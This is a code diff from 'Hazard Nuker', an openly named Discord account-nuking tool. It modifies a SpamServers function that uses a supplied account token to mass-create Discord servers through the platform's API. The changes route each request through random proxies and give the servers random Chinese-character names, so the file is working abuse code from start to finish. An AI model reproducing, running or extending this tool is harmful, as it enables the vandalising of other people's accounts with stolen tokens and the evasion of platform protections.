@@ -1,22 +1,29 @@
 # Hazard was proudly coded by Rdimo (https://github.com/Rdimo).
+# Copyright (c) 2021 Rdimo#6969 | https://Cheataway.com
 # Hazard Nuker under the GNU General Public Liscense v2 (1991).
 
 import requests
-import Hazard
+
 from colorama import Fore
 
-from util.plugins.common import print_slow, getheaders
+from util.plugins.common import getheaders, proxy, random_chinese
 
-def SpamServers(token, Server_Name):
-    for i in range(100):#change this to the amount of servers you want to create | Can create 200 servers but they need nitro for that
+def SpamServers(token, icon, name=None):
+    if name:
+        for i in range(4):
+            try:
+                #Create all the servers named whatever you want
+                payload = {'name': f'{name}', 'region': 'europe', 'icon': icon, 'channels': None}
+                requests.post('https://discord.com/api/v7/guilds', proxies={"http": f'{proxy()}'}, headers=getheaders(token), json=payload)
+                print(f"{Fore.BLUE}Created {name}.{Fore.RESET}")
+            except Exception as e:
+                print(f"The following exception has been encountered and is being ignored: {e}")
+    for i in range(4):
+        server_name = random_chinese(5,12)
         try:
             #Create all the servers named whatever you want
-            payload = {'name': f'{Server_Name}', 'region': 'europe', 'icon': None, 'channels': None}
-            requests.post('https://discord.com/api/v9/guilds', headers=getheaders(token), json=payload)
-            print(f"{Fore.BLUE}Created {Server_Name} #{i}.{Fore.RESET}")
+            payload = {'name': f'{server_name}', 'region': 'europe', 'icon': icon , 'channels': None}
+            requests.post('https://discord.com/api/v7/guilds', proxies={"http": f'{proxy()}'}, headers=getheaders(token), json=payload)
+            print(f"{Fore.BLUE}Created {server_name}.{Fore.RESET}")
         except Exception as e:
             print(f"The following exception has been encountered and is being ignored: {e}")
-    print_slow(f"{Fore.LIGHTGREEN_EX}Successfully Created all the servers! ")
-    print("Enter anything to continue. . . ", end="")
-    input()
-    Hazard.main()
